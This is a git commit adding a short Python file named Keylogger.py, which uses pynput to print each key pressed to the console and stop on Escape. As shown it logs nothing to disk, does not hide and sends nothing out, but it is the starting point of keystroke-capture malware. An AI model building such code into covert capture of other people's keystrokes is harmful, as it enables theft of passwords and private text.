bcbb4ab8a8fc1cc093ea9d055d8e2b4fdc7522ab
zstevetin <39228275+zstevetin@users.noreply.github.com>
2019-05-19 20:43:50 -0400

    Add files via upload

---
+++ Keylogger.py
@@ -0,0 +1,14 @@
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    print("{0} pressed".format(key))
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as Listener:
+    Listener.join()
